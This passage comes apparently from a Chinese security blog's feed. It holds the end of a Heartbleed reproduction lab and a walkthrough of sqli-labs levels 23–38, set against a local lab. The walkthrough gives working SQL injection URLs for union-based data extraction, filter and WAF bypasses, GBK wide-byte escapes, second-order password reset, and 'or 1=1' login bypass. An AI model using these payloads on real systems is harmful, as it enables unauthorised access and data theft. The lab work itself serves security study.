src="http://upload-images.jianshu.io/upload_images/6269327-d7aa94325f96a2d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>然后重启apache<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/<span class="built_in">local</span>/httpd/bin/apachectl  restart</span><br></pre></td></tr></table></figure></p><p>访问指定页面就可以使用https了：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-514b9552a5b98f96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>下载编译安装php5.3.30<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span>/php   --with-apxs2=/usr/<span class="built_in">local</span>/httpd/bin/apxs  --with-config-file-path=/usr/<span class="built_in">local</span>/php/etc   --<span class="built_in">enable</span>-fpm --<span class="built_in">enable</span>-mbstring --<span class="built_in">enable</span>-gd --<span class="built_in">enable</span>-xml    --with-mysqli=mysqlnd</span><br></pre></td></tr></table></figure></p><p>然后编辑一下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cp php.ini-development  /usr/<span class="built_in">local</span>/php/etc/php.ini</span><br></pre></td></tr></table></figure></p><p>修改Apache的配置文件httpd.conf<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DirectoryIndex index.html index.php <span class="comment">#添加index.php</span></span><br><span class="line">找到：</span><br><span class="line">AddType  application/x-compress .Z</span><br><span class="line">AddType application/x-gzip .gz .tgz</span><br><span class="line">添加如下内容</span><br><span class="line">AddType application/x-httpd-php-source .phps</span><br><span class="line">AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure></p><p>检查LoadModule php5_module modules/libphp5.so 是否已经添加 libphp5.so文件是否存在。存在就可以，写一个简单的php查看：</p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-a48245c474c2b0b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"><br>可以用php进行访问。</p><h3 id="利用poc进行攻击"><a href="#利用poc进行攻击" class="headerlink" title="利用poc进行攻击"></a>利用poc进行攻击</h3><p>从其他主机访问：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-87e38c38397821ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-a906b9e7de291cb8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>可以看到我们刚刚生成的私人证书，在其他主机访问则不安全。<br>下面尝试使用namp自带的脚本进行检测，进行poc攻击：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -sV -p 443 --script=ssl-heartbleed 127.0.0.1</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-71039d4eb078555c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>可以看到成功扫出来了漏洞：ssl-heartbleed,危险程度是高。<br>接着尝试使用网上的脚本进行测试：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-6d0d8fd778e19d6e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-7ea36579f0205264.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"></p><h3 id="编译安装配置https-php-mysql环境"><a href="#编译安装配置https-php-mysql环境" class="headerlink" title="编译安装配置https+php+mysql环境"></a>编译安装配置https+php+mysql环境</h3><p>下载php5.6.17并编译安装：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span>/php</span><br></pre></td></tr></table></figure></p><h3 id="通过修改心跳包数据、抓包等方式进一步理解heartbleed的漏洞原理；"><a href="#通过修改心跳包数据、抓包等方式进一步理解heartbleed的漏洞原理；" class="headerlink" title="通过修改心跳包数据、抓包等方式进一步理解heartbleed的漏洞原理；"></a>通过修改心跳包数据、抓包等方式进一步理解heartbleed的漏洞原理；</h3><p>通过在攻击机执行网上的poc利用 脚本，然后用wireshark抓包观察：<br>首先攻击机先测试能否访问靶机：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-b33c8a003b54b387.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>然后打开wireshark监听网卡，设置过滤指定地址和端口：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4d02742189726793.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>攻击机执行攻击（没有更改长度）脚本：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d2a0d1567abc7a00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br>抓取到心跳包请求包和响应包，我们点击请求包查看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-46e8758109e2413d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>这是正常的请求包，主要这里的payload长度。<br>下面看看请求包的详细情况：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-09f6eb04de47fe4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br>后面这16位：<br>18表示contenet-type:heartbleed(24)<br>03 02表示 版本<br>03 表示长度<br>01 表示是请求<br>20 00就是payload就是我们要读取的数据的长度。<br>接着我们进行更改payload的长度进行测试：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-67f4f17b22ea0830.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br>将代码后上面后四位改为ff ff，执行，抓包查看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-36678ee0008887b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"><br>可以看到此时的请求包的payload已经变为了65535。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-8030a5eccfe15d87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.png"><br>因为这里的请求长度就是ff ff。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4a134409836e2b8f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20.png"><br>同样的响应包的也变成了65535变成了我们更改的64k的数据了，这样我们就成功每次可以读取到64KB数据。<br>接着我们建立一个简单的php+apache+mysql的网站，然后进行测试。<br>最新版mysql5.7以上使用SET PASSWORD = ‘&lt;plaintext_password&gt;’更改密码！！<br>设置可以使用弱密码set global validate_password_policy=0;<br>我直接将我数据库的大作业考进知道文件夹然后进行测试：<br>在攻击机访问我的数据管理系统：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4ecf1551053497c7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="22.png"><br>成功窃取了内存中的数据！！！！</p><h3 id="heartbleed漏洞的风险是什么。"><a href="#heartbleed漏洞的风险是什么。" class="headerlink" title="heartbleed漏洞的风险是什么。"></a>heartbleed漏洞的风险是什么。</h3><p>如果一个服务器存在heartbleed的漏洞很可能会被攻击者窃取内存中的数据，虽然每次是以最大64kb的数据被窃取，但是很有可能被攻击者窃取了秘钥等重要的信息来进行更危险的攻击。</p><h2 id="使用openvas扫描"><a href="#使用openvas扫描" class="headerlink" title="使用openvas扫描"></a>使用openvas扫描</h2><p><img src="http://upload-images.jianshu.io/upload_images/6269327-e9e0b57a771cbc4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="23.png"><br>可以看到成功扫描出来heartbleed漏洞。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;heartbleed漏洞及内存信息窃取&quot;&gt;&lt;a href=&quot;#hear
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://rliyuqing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="heartbleed漏洞" scheme="https://rliyuqing.github.io/tags/heartbleed%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-lab实验Task2（less23-38）</title>
    <link href="https://rliyuqing.github.io/2019/04/15/7.%20Sqli-lab%E5%AE%9E%E9%AA%8CTask2%EF%BC%88less23-38%EF%BC%89/"/>
    <id>https://rliyuqing.github.io/2019/04/15/7. Sqli-lab实验Task2（less23-38）/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:50:04.582Z</updated>
    
    <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="Sqli-labs实验Task2（less23-38）"><a href="#Sqli-labs实验Task2（less23-38）" class="headerlink" title="Sqli-labs实验Task2（less23-38）"></a>Sqli-labs实验Task2（less23-38）</h1><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>进入实验页面可以看到又回到了最开始的类型，我们尝试一下有没有注入。<br>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-23/?id=1’</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-d7b292138289ee69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>根据报错可以知道是使用单引号闭合的，继续测试。<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-23/?id=1<span class="string">' order by 1 -- #</span></span><br></pre></td></tr></table></figure></p><p>但是发现无论怎样都报错了，显示语句有错误，猜测并经过后面的源代码查看可知是代码将—和#的注释和转义了，所以才会出错，这个时候我们就只能对后面剩余的单引号进行闭合了。<br>敏感信息获取：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-23/?id=0<span class="string">' union select 1,user(),3 and '</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-91e33010b789f208.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>这个比较简单，过滤了注释符号我们只需要注意闭合后面的单引号就行了</p><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>这个是一个登陆界面的注入测试，首先看到和之前有一些不一样，下面有忘记密码和新用户注册，忘记密码的页面一般是存在注入可能性比较高的地方，去这个页面试试 ：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4092f625bac77a54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>这……这样子啊。还有一个注册界面，可以直接注册一个账号。<br>我们尝试在登陆界面进行注入测试，发现无法成功，很可能注入的点不在这。这个实验的题目叫做Second Degree injection，二次注入，思考思考，问题肯定没这么简单，我们先注册一个，然后登陆试试。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-17d9d83e29def919.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>成功登陆后竟然还有修改密码的功能，放这里肯定没有，既然外面不能注入，那么很有可能在这里注入了。Have a try！<br>额，经过一些测试，发现还是不能注入，那么问题出在哪里呢？<br>进行代码审计看一下源代码：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">'current_password'</span>]);</span><br><span class="line"><span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">'password'</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">'re_password'</span>]);</span><br></pre></td></tr></table></figure></p><p>可以看到在pass_change.php这个文件里面没有对传入的username进行过滤。这样子，我们理一下思路，如果我们新注册一个用户名叫admin’ #然后我们登录了更改密码是不是就可以把admin 的密码改了呢？继续尝试一下。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-1e8417f64549fe12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>登录之后更改密码为123，然后登出。然后用admin和123登录。成功！<br><img src="http://upload-images.jianshu.io/upload_images/6269327-ba8f89ffde8a7144.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"><br>这个实验的思路特别巧妙，基本没有代码审计的话很难会找到注入的点，所以没有及其敏感的意识很难找到漏洞。</p><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>这个题很简单，我们一进页面就可以看到，告诉我们所以得or和and不能被使用，应该都被过滤了。这样有过一点经验的朋友一定很快就反应过来，这很简单了，绕过这种注释的方法有很多，比如编码转换或者大小写，双写绕过等，我们来试试看。<br>检查注入猜字段：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-25/?id=1’ order by 3 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-428e6b7578c97f4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"><br>可以看到连order by里面的or都被过滤了。我们试试大小写绕过，发现不行，试试双写绕过：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-25/?id=1’ oorrder by 3 -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-4f6f40b4deee6195.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>哈哈，可以，这样就很简单了！后面的过程就都差不多了。</p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这个和上一个差不多，也是提示or和and被过滤了。就是没有报错，试试双写绕过：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-25a/?id=1 oorrder by 3 -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>成功执行，试试敏感信息获取:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-25a/?id=0 union select user(),database(),1 -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>可以看到成功获取了，这里和上一个差不多，用的or和and的时候双写绕过就行。这个和上一个不一样的地方就在于这里是盲注，没有报错，上一个可以根据报错判断一些东西。</p><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>这一次也是一样，我们的空格和注释不能用了，空格和注释被过滤了。试试用%20替换，发现也不行。注释也被过滤了那用注释绕过空格也不行了。换其他绕过方法试试。<br>测试过程中发现or和and还是继续被过滤所以记得双写。<br>试试利用括号绕过的盲注：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-26/?id=1<span class="string">'anandd(ascii(mid(user(),1,1))=114)anandd'</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-78361aa253e34dd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>成功绕过！这个是利用括号来绕过空格执行sql语句的方法，一般使用于盲注，可以看到我选择的是user用户名的第一个字符r的ascii码刚好对于114，成功输出。如果后面的条件不成立就不输出，这样就可以盲注啦。注意双字节绕过or和and。因为注释也被过滤了，所以也要注意对后面的引号进行闭合。</p><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>这个也是一样过滤了注释和空格。这个和上个差不多只是把报错给过滤了，使我们看不到报错，不过对于盲注来说这没有太大的影响，我们使用上一个的语句依旧可以注入！</p><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>这一次更狠，union和select被过滤了。经过简单的测试我们发现，这次没有过滤and，or，但过滤了空格和注释。<br>简单的测试一下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-27/?id=1<span class="string">' and '</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p><p>成功的，那么对于过滤了union和select。但是发现union双写可以绕过，select双写不行，但是大小写能绕过，那就很简单了，和之前的注入差不多：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-27/?id=1<span class="string">'and(ascii(mid(user(),1,1))=114)and'</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p><p>语句和之前的差不多，主要是绕过空格的，而遇到有select和union的语句只需要大小写绕过就可以了！</p><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>原本以为这个和上个差不多，但是发现执行语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-27a/?id=1<span class="string">'and(ascii(mid(user(),1,1))=1144)and'</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p><p>返回正常显示id=1的数据，无论我ascii的值输入多少都显示这个页面。<br>测试后发现这个闭合时双引号。换成语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-27a/?id=1<span class="string">"and(ascii(mid(user(),1,1))=114)and"</span>1<span class="string">"="</span>1</span><br></pre></td></tr></table></figure></p><p>其他的和之前都差不多。</p><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>这一次可以根据页面提示看到union和select被过滤了。<br>尝试猜测闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-28/?id=1<span class="string">')and('</span>1<span class="string">')=('</span>1</span><br></pre></td></tr></table></figure></p><p>正常返回说明单引号闭合。且存在注入，过滤空格，注释。<br>获取数据：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-28/?id=1<span class="string">')and(ascii(mid(user(),1,1))=114)and('</span>1<span class="string">')=('</span>1</span><br></pre></td></tr></table></figure></p><p>和27差不多。只是闭合方式不同</p><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>这里只有union和select被过滤，其他的都没被过滤。这个就更简单了，只需要绕过union和select就足够了，参考上面几个很容易就可以成功注入。<br>随便给一个例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-28a/?id=0<span class="string">') unionunion select select user(),database(),1 and ('</span>1<span class="string">')=('</span>1</span><br></pre></td></tr></table></figure></p><h2 id="环境配置说明（less29-32）"><a href="#环境配置说明（less29-32）" class="headerlink" title="环境配置说明（less29-32）"></a>环境配置说明（less29-32）</h2><p>这四个实验使用到waf，基本原理可以看一下网上的一些博客，大多都有详细说明，比如：<a href="http://www.cnblogs.com/lcamry/p/5762961.html。" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5762961.html。</a><br>因为我使用的是phpstudy，所以也大概说一下我是如何配的。</p><ol><li>下载tomcat，解压就行。</li><li>将tomcat-files.zip解压到tomcat服务器webapp/ROOT目录下，并将29,30,31里的跳转url改为我们自己的。每个人不同，比如我的跳转url设置的是<a href="http://127.0.0.1/sqli-labs-master/Less-29/index.php?id=1。32里面要设置数据库的连接密码。" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-29/index.php?id=1。32里面要设置数据库的连接密码。</a></li><li>下载安装好java环境，可在cmd输入javac测试。</li><li>将下载的mysql-connector-java.jar文件放到tomcat解压文件夹的lib文件夹中</li><li>点击tomcat/bin/startup.bat文件启动tomcat就可以啦。弹出的jar文件不能关掉，不然不能访问tomcat了。<br>然后我们就可以通过访问（tomcat默认开启8080端口）tomcat目录里面的四个实验进行测试了！<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2>可以看到这里页面提示是是使用了世界上最强大的waf，废话不多说我们之间进行挑战看一看。<br>首先判断闭合情况：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></li></ol><p>稍微解释一下，因为我们是tomcat和apache两重的服务器端的，所以我们需要进行两个id的传参，那么如果前后两个传递的不相等会怎么样呢？<br><img src="http://upload-images.jianshu.io/upload_images/6269327-98eaa103a55ac1ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>如果是id=1&amp;id=2，那会显示什么呢？<br>apache（php）解析最后一个参数，即显示id=2的内容。Tomcat（jsp）解析第一个参数，即显示id=1的内容。<br>此处应该是id=2的内容，因为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache处理的数据。<br>那么继续测试，我们使用单引号进行闭合了，看看页面相应：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-3a7f15d1c1247125.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"><br>已经很明显就知道是单引号闭合了。<br>后面其实就很简单了，获取敏感信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=0<span class="string">'  union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p><p>很容易获取，但是虽然看着很简单，我们进行代码审计可以看到，这是因为jsp代码中只对tomcat的传参进行了过滤，并没有对后面apache传入的进行防范，所以很容易就成功了。<br>其他的可以自己构造语句进行测试。</p><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>这个和上个差不多，只不过把报错屏蔽了，把闭合换成了双引号。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-30/index.jsp?id=1&amp;id=0<span class="string">" union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p><p>其他可自己继续进行测试。</p><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>依旧差不多，有错误提示，闭合是双引号加括号。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-31/index.jsp?id=1&amp;id=0<span class="string">")  union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>这一次不一样了，试了很多闭合发现依旧正常返回，第一个反应就是不是第二个传参，而是第一个传参，所以对第一个进行测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-32/index.jsp?id=1<span class="string">') -- #&amp;id=1</span></span><br></pre></td></tr></table></figure></p><p>多试几次便可知道闭合方式是单引号加括号。<br>敏感信息获取：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-32/index.jsp?id=1<span class="string">') union select 1,user(),database() -- #&amp;id=1</span></span><br></pre></td></tr></table></figure></p><p>突然发现这里还没有限制输出。。。</p><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>回到之前的apache的服务器的实验链接。<br>首先观察一下新的挑战的页面的提示多了一行。上面一行是我们的传参，下面一行是我们输入的十六进制编码之后的数，我们可以用hackbar进行hex encode看看1编码之后就是31。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-40010cf41481cfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>闭合测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-33/?id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-0fb9ae426945eecd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>果然，被过滤了，那么我们就考虑如何绕过这个过滤。在之前也遇到这样的问题我们试着绕过看看。这里是反斜杠过滤，可以看到下面的hex编码是5c，对于这个有着典型的绕过方法—宽字节注入。<br>大概说一说这个宽字节注入。我们的mysql在使用gbk编码的时候会将两个字符看成一个汉字（前一个字符的ascii码必须大于128才能到汉字的范围）。所以这个时候如果我们构造一个如下的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-33/?id=1%df%27</span><br></pre></td></tr></table></figure></p><p>就会报错！<br><img src="http://upload-images.jianshu.io/upload_images/6269327-fad023b8ea55aa37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-5f2444d84754947f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>可以看到报错出现一个乱码，因为mysql不支持那个中文字符。同时后面的单引号也逃逸出来了，这就是因为mysql将%df%5c两个字符当成一个汉字来看，我们就绕过来这个反斜杠了。想要了解更多可以google宽字节输入看看。<br>敏感信息获取：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-33/?id=0%df%27 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>这次又回到了登录框的注入。<br>随便一个万能密码试试：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-f75d4532bf4a1e1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br>果然，又是反斜杠过滤了，这里是post的传参，要过滤反斜杠，参考上面的。因为上面是url传参，所以可以用url编码构造宽字节绕过，但这里是post，我们是否可以构造其他的编码来绕过反斜杠呢？<br>这里我们使用另一种构造：将utf-8转换为utf-16或 utf-32进行过滤反斜杠。我们通过网上的工具，将utf-8的单引号转换成utf-16的：将’转为utf-16为�’，然后我们就可以用万能密码进行登录了。账号填：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ �<span class="string">'  or  1=1 -- #</span></span><br></pre></td></tr></table></figure></p><p>密码随便填就可以成功登陆啦。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-7dde8e45775fbf9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Less-35</span><br><span class="line">有一个新挑战，尝试闭合发现被反斜杠过滤了，尝试宽字节注入，发现也不行！但是在测试的时候我们发现，这里的id是没有被闭合的。。。。所以直接就可以注入！</span><br><span class="line">​``` bash</span><br><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-35/?id=0 union select 1,user(),database() -- #</span><br></pre></td></tr></table></figure></p><p>这个比较简单，不要想多了。</p><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>这个和上面的差不多：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-36/?id=0%df%27 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>宽字节注入。<br>结合上面的我们也可以利用utf-16进行注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-36/?id=0%EF%BF%BD%27 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>这个和34的差不多,用户填：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ �<span class="string">'  or  1=1 -- #</span></span><br></pre></td></tr></table></figure></p><p>密码随便填就可以成功登陆，原理和34差不多。只不过源码部分用不同的函数过滤。</p><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>emmmmmm这个也很简单：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-38/?id=0<span class="string">' union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p><p>基本都在前面出现过。<br>part2的部分也结束了，会尽快把后面的也写上来的！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Sqli-labs实验Task2（less23-38）&quot;&gt;&lt;a href=&quot;#Sqli-labs实验Task2（less23-38）&quot; class=&quot;heade
      
    
    </summary>
    
      <category term="攻防实验" scheme="https://rliyuqing.github.io/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="sqli-labs" scheme="https://rliyuqing.github.io/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>MySQL弱密码和webshell（附可用于php7的菜刀）</title>
    <link href="https://rliyuqing.github.io/2019/04/15/3.%20MySQL%E5%BC%B1%E5%AF%86%E7%A0%81%E5%92%8Cwebshell%EF%BC%88%E9%99%84%E5%8F%AF%E7%94%A8%E4%BA%8Ephp7%E7%9A%84%E8%8F%9C%E5%88%80%EF%BC%89/"/>
    <id>https://rliyuqing.github.io/2019/04/15/3. MySQL弱密码和webshell（附可用于php7的菜刀）/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:48:34.573Z</updated>
    
